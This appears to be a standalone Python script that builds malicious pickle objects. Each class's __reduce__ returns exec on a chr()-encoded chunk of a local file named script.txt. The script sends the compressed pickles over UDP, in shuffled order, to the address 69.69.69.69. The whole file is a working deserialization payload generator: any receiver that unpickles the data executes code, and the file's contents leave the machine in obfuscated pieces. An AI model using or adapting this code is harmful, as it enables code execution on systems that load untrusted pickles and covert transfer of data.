import pickle
import socket
import random
import string
import zlib

CLASS_TEMPLATE = """
class {name}:
    def __reduce__(self):
        return (exec, ('print({payload}, end="")',))
"""

def gen_class(name, payload):
    return CLASS_TEMPLATE.format(name=name, payload=payload)

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
    CHUNKS = 10
    payload = open('./script.txt', 'rb').read()
    offsets = [i for i in range(0, len(payload), CHUNKS)]
    while offsets != []:
        i = random.choice(offsets)
        offsets.remove(i)
        chrs = []
        for char in payload[i:i+CHUNKS]:
            chrs.append(f'chr({char})')
        classname = "".join(random.choices(string.ascii_letters, k=10))
        class_ = gen_class(classname, "+".join(chrs))
        exec(class_)
        pickled = pickle.dumps(eval(classname+"()"))
        pickled = b"PICKLE" + pickled
        send = zlib.compress(pickled, level=2)
        s.sendto(send, ('69.69.69.69', 8000+i))
